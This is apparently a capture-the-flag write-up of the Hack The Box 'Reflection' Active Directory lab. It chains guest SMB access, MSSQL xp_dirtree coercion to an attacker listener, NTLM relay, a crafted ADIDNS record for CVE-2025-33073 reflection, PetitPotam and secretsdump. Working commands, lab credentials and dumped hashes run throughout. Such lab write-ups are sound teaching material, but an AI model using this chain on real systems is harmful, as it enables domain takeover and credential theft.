---
title: "HTB: Reflection, with the actual reflection"
date: 2026-03-24 00:00:00 +0000
categories: [hackthebox, vulnlab]
tags: [active-directory, ADIDNS, smb, mssql, ntlm-relay, ntlm-reflection, coercion, petitpotam, CVE-2025-33073, hackthebox, vulnlab]
description: "An alternative approach to solve Reflection."
---

## Overview

We are given three hosts:

```
10.13.38.44  dc01.reflection.vl  (signing:False) - 53,88,389,445,1433,5985,3389...
10.13.38.45  ms01.reflection.vl  (signing:False) - 445,1433,3389...
10.13.38.46  ws01.reflection.vl  (signing:False) - 445,3389...
```

Judging by the open ports, we can attest that `10.13.38.44` is the domain controller. Notably, SMB signing is disabled on all three machines, making them high-value candidates for relay attacks.

---

## Enumeration

### SMB Guest Access

By first looking at SMB more closely, we can see that MS01 is the only host where the SMB guest account is not disabled:

```shell
xqn@0xqn > nxc smb 10.13.38.44 -u guest -p ''
SMB         10.13.38.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.44     445    DC01             [-] reflection.vl\guest: STATUS_ACCOUNT_DISABLED

xqn@0xqn > nxc smb 10.13.38.45 -u guest -p ''
SMB         10.13.38.45     445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.45     445    MS01             [+] reflection.vl\guest:

xqn@0xqn > nxc smb 10.13.38.46 -u guest -p ''
SMB         10.13.38.46     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.46     445    WS01             [-] reflection.vl\guest: STATUS_ACCOUNT_DISABLED
```

### SMB Share Enumeration on MS01

They all look like standard SMB folders, with the exception of `staging`:

```shell
xqn@0xqn > nxc smb 10.13.38.45 -u guest -p '' --shares
SMB         10.13.38.45     445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.45     445    MS01             [+] reflection.vl\guest:
SMB         10.13.38.45     445    MS01             [*] Enumerated shares
SMB         10.13.38.45     445    MS01             Share           Permissions     Remark
SMB         10.13.38.45     445    MS01             -----           -----------     ------
SMB         10.13.38.45     445    MS01             ADMIN$                          Remote Admin
SMB         10.13.38.45     445    MS01             C$                              Default share
SMB         10.13.38.45     445    MS01             IPC$            READ            Remote IPC
SMB         10.13.38.45     445    MS01             staging         READ            staging environment
```

Inside this non-standard share, we find a configuration file that appears to belong to a database:

```shell
xqn@0xqn > smbclient -U'guest%' //10.13.38.45/staging
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  7 13:42:48 2023
  ..                                  D        0  Wed Jun  7 13:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023
  6261245 blocks of size 4096. 1786465 blocks available
smb: \> get staging_db.conf
getting file \staging_db.conf of size 50 as staging_db.conf (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

We found the following entries:

```
user=web_staging
password=Washroom510
db=staging
```

---

## MSSQL on MS01

Knowing that Microsoft SQL Server is present on both DC01 and MS01, it is worth spraying these credentials against both:

```shell
xqn@0xqn > impacket-mssqlclient web_staging:'Washroom510'@10.13.38.44
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'web_staging'.

xqn@0xqn > impacket-mssqlclient web_staging:'Washroom510'@10.13.38.45
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
<...>
SQL (web_staging  guest@master)>
```

We get a hit on MS01's MSSQL server. As expected, besides the default databases, we find the `staging` one:

```shell
SQL (web_staging  guest@master)> enum_db
name      is_trustworthy_on
-------   -----------------
master                    0
tempdb                    0
model                     0
msdb                      1
staging                   0

SQL (web_staging  guest@master)> enum_owner
Database   Owner
--------   -----------
master     sa
tempdb     sa
model      sa
msdb       sa
staging    web_staging
```

Switching into the `staging` database and enumerating the users table:

```shell
SQL (web_staging  guest@master)> use staging
ENVCHANGE(DATABASE): Old Value: master, New Value: staging
INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.
SQL (web_staging  dbo@staging)> SELECT table_name FROM staging.INFORMATION_SCHEMA.tables
table_name
----------
users

SQL (web_staging  dbo@staging)> SELECT * FROM users
id   username   password
--   --------   -------------
 1   b'dev01'   b'Initial123'
 2   b'dev02'   b'Initial123'
```

The two entries contain credentials that do not lead anywhere useful on their own.

---

## NTLM Relay via MSSQL

Returning to our first finding about SMB signing being disabled, we can try to coerce authentication via `xp_dirtree` and relay it. We first attempt to capture the challenge:

```shell
SQL (web_staging  dbo@staging)> xp_dirtree //10.10.16.8/share
```

From our Responder server we capture the NTLMv2 challenge for `REFLECTION\svc_web_staging`. Unfortunately, cracking it offline yields no result. However, we can relay it instead.

We start `ntlmrelayx` with interactive shell mode targeting DC01:

```shell
xqn@0xqn > impacket-ntlmrelayx -smb2support -t smb://10.13.38.44 -i
```

Then trigger the authentication again from the MSSQL session:

```shell
SQL (web_staging  dbo@staging)> xp_dirtree //10.10.16.8/share
```

The relay succeeds:

```shell
xqn@0xqn > impacket-ntlmrelayx -smb2support -t smb://10.13.38.44 -i
<...>
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.13.38.45, attacking target smb://10.13.38.44
[*] (SMB): Authenticating connection from REFLECTION/SVC_WEB_STAGING@10.13.38.45 against smb://10.13.38.44 SUCCEED [1]
[*] smb://REFLECTION/SVC_WEB_STAGING@10.13.38.44 [1] -> Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

We connect to the interactive shell:

```shell
xqn@0xqn > nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
```

As expected, we are now operating in the context of a domain user on DC01. Besides the standard shares, we find a `prod` share:

```shell
# use prod
# ls
drw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .
drw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..
-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf
```

The format is nearly identical to the one found on MS01, but with a different user and database:

```
user=web_prod
password=Tribesman201
db=prod
```

---

## Pivoting to DC01's MSSQL

Using the newly acquired credentials we can finally access the domain controller MSSQL:

```shell
xqn@0xqn > impacket-mssqlclient web_prod:'Tribesman201'@10.13.38.44
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
<...>
SQL (web_prod  guest@master)> enum_db
name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1
prod                     0
```

Dumping the `prod` database:

```shell
SQL (web_prod  dbo@prod)> SELECT * FROM users
id   name              password
--   ---------------   -----------------
 1   b'abbie.smith'    b'CMe1x+nlRaaWEw'
 2   b'dorothy.rose'   b'hC_fny3OK9glSJ'
```

Spraying these credentials against the domain:

```shell
xqn@0xqn > nxc smb 10.13.38.44 -u users.txt -p pass.txt --continue-on-success
SMB         10.13.38.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.44     445    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw
```

We now have a valid domain user: `abbie.smith`.

---

## NTLM Reflection via Marshaled Target Info

> **Background:** CVE-2025-33073 is an NTLM Reflection vulnerability that bypasses the existing mitigations Windows has built up against self-relay attacks over the years. The trick relies on how Windows resolves SPNs: when an SMB client connects to a target, it calls `SecMakeSPNEx2`, which internally uses `CredMarshalTargetInfo` to encode target information as Base64 and append it to the SPN. By registering a crafted DNS record containing this blob as its name, we can make the client resolve and strip the blob, leaving only the machine's own hostname. The client then recognises the target as itself and includes its workstation and domain name in the `NTLM_NEGOTIATE` message, which signals the server to set the `NTLMSSP_NEGOTIATE_LOCAL_CALL` flag, triggering NTLM local authentication and effectively reflecting the authentication back to the originating machine.
>
> References:
> - [Project Zero: Using Kerberos for Authentication Relay](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
> - [Synacktiv: NTLM Reflection is Dead — Long Live NTLM Reflection (CVE-2025-33073)](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)

The crafted marshaled DNS record for DC01 looks like this:

```
dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

When the SMB client resolves this name, `CredUnmarshalTargetInfo` strips the blob, leaving just `dc01`.
### Adding the Crafted DNS Record

By default, any domain user can add child objects to Active Directory-Integrated DNS to facilitate dynamic DNS updates. We use `abbie.smith` to register the crafted record pointing to our machine:

```shell
xqn@0xqn > dnstool -u 'reflection\abbie.smith' -p 'CMe1x+nlRaaWEw' 10.13.38.44 \
-a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.16.8
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Verifying DC01 is vulnerable to coercion:

```shell
xqn@0xqn > nxc smb 10.13.38.44 -u abbie.smith -p 'CMe1x+nlRaaWEw' -M coerce_plus
SMB         10.13.38.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.44     445    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw
COERCE_PLUS 10.13.38.44     445    DC01             VULNERABLE, PetitPotam
```

### Relaying with SOCKS

We start `ntlmrelayx` in SOCKS mode, targeting DC01:

```shell
xqn@0xqn > impacket-ntlmrelayx -smb2support -t smb://10.13.38.44 -socks
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
<...>
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>
```

Now we coerce DC01 via PetitPotam, pointing it at our crafted DNS record:

```shell
xqn@0xqn > PetitPotam -u abbie.smith -p 'CMe1x+nlRaaWEw' -d \
REFLECTION.VL  dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA DC01.REFLECTION.VL

<...>
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[+] Attack worked!
```

Back on our listener, we can notice the connection both originates and lands on `10.13.38.44`, the reflection indeed worked.

```shell
xqn@0xqn > impacket-ntlmrelayx -smb2support -t smb://10.13.38.44 -socks
<...>
ntlmrelayx> [*] (SMB): Received connection from 10.13.38.44, attacking target smb://10.13.38.44
[*] (SMB): Authenticating connection from /@10.13.38.44 against smb://10.13.38.44 SUCCEED [1]
[*] SOCKS: Adding SMB:///@10.13.38.44(445) [1] to active SOCKS connection. Enjoy
```

### I want your secrets

```shell
xqn@0xqn > proxychains -q impacket-secretsdump -no-pass '@10.13.38.44'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xfcb176024780bc221b4c7b3f35e16dfd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87a3e893c70111c8cad0ecbda9f4002:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<...>
```

---

### Wrapping it up

To conclude, here are the latest updates installed on the machine, dating back to May 2025, the patch itself was deployed on [June 10, 2025](https://msrc.microsoft.com/update-guide/en-EN/vulnerability/CVE-2025-33073).


```shell
PS C:\Windows\System32> Get-Hotfix | Select-Object HotFixID,Description,InstalledOn

HotFixID  Description     InstalledOn
--------  -----------     -----------
KB5055169 Update          5/19/2025 12:00:00 AM
KB5012170 Security Update 6/6/2023  12:00:00 AM
KB5026370 Security Update 6/6/2023  12:00:00 AM
KB5058531 Security Update 5/19/2025 12:00:00 AM
```
